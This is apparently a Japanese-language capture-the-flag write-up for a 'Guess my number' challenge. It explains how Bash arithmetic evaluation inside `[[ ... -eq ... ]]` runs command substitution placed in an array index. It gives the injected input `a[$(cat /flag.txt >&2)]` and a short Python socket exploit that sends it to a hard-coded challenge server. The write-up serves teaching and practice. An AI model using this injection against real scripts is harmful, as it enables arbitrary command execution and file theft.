# Guess my number writeup

## 1. 概要
本問題は提供されたBashスクリプトに対し算術式評価の脆弱性を利用してフラグを読み取る問題です．

## 2. 問題の分析

### ファイル構成
* `chall.sh`
* `docker-compose.yml`
* `Dockerfile`（コンテナのOSは`ubuntu:24.04`，TCPポート1337で`chall.sh`を実行する環境，`socat`の実行引数には標準エラー出力が通信先に送信される設定あり）
* `flag.txt`

### ソースコードの確認
`chall.sh`では`RANDOM`変数を用いて0から999までの乱数を生成しユーザー入力を`read -r GUESS`で受け取っています．
その後`if [[ "$GUESS" -eq "$SECRET" ]]; then`という条件式で比較を行っています．

## 3. 脆弱性と攻略方針

### 脆弱性
Bashの`[[ ... -eq ... ]]`という算術比較演算子を用いた条件式では内部で算術式評価が行われます．
この算術式評価において変数が評価される際攻撃者が用意した文字列がさらに算術式として解釈される脆弱性が存在します．
特に配列のインデックスとしてコマンド置換（`$(...)`）を含む文字列を渡すとそのコマンドが実行されてしまいます．

### 攻略方針：
`GUESS`への入力として`a[$(cat /flag.txt >&2)]`を送信します．
これにより算術式評価の過程で`cat /flag.txt >&2`が実行されます．
`Dockerfile`の設定では標準エラー出力がソケットにリダイレクトされているため実行結果であるフラグの内容が標準エラー出力を経由して手元に返されます．

## 4. エクスプロイトコード
```python
import socket

HOST = "34.170.146.252"
PORT = 21406

def exploit():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        
        # プロンプトを受信
        s.recv(1024).decode()
        
        # ペイロードを送信
        payload = "a[$(cat /flag.txt >&2)]\n"
        s.sendall(payload.encode())
        
        # 標準エラー出力を経由して返ってくるフラグを受信
        response = s.recv(1024).decode()
        print("Result:\n" + response.strip())

if __name__ == "__main__":
    exploit()
```